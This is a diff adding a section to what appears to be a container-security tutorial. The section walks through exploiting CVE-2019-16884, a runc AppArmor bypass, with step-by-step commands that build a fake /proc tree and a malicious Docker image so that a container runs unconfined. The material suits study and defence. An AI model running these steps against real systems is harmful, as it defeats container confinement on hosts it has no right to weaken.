@@ -213,7 +213,32 @@ Finally, we can execute the attack by spawning a process that immediately ends i
 ![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/chmod_attack.PNG)	
 
 ### Exploiting AppArmor bypass vulnerability (CVE-2019-16884)
+runc through 1.0.0-rc8, as used in Docker through 19.03.2-ce and other products, allows AppArmor restriction bypass because libcontainer/rootfs_linux.go incorrectly checks mount targets, and thus a malicious Docker image can mount over a /proc directory.
 
+Create parent directory:
+mkdir -p rootfs/proc/self/{attr,fd}
+Normally, checkMountDestinations is supposed to prevent mounting on top of /proc. But it does not prevent us from mounting. The reason is that the dest argument is resolved to an absolute path using securejoin.SecureJoin, unlike the blacklist in checkMountDestinations, which is relative to the rootfs.
+
+Create new files in the respective directory:
+touch rootfs/proc/self/{status,attr/exec}
+touch rootfs/proc/self/fd/{4,5}
+
+Mount the volume by adding to the dockerfile using cat command:
+cat <<EOF > Dockerfile
+FROM busybox
+ADD rootfs /
+VOLUME /proc
+EOF
+Busybox is a program that can perform the actions of many common unix programs, such as ls, chmod, wget, cat, etc. Most commonly, it's used in embedded Linux due to its small executable size.
+
+Build a docker image from the modified Dockerfile and assign it a tag called apparmor-bypass
+sudo docker build -t apparmor-bypass .
+
+Run the docker image:
+sudo docker run --rm -it --security-opt "apparmor=docker-default"  apparmor-bypass
+
+As we can see, the container runs unconfined.
+While checking for process status, we can see that the docker daemon is running unconfined:
 
 ## Securing vulnerabilities in docker images  
 
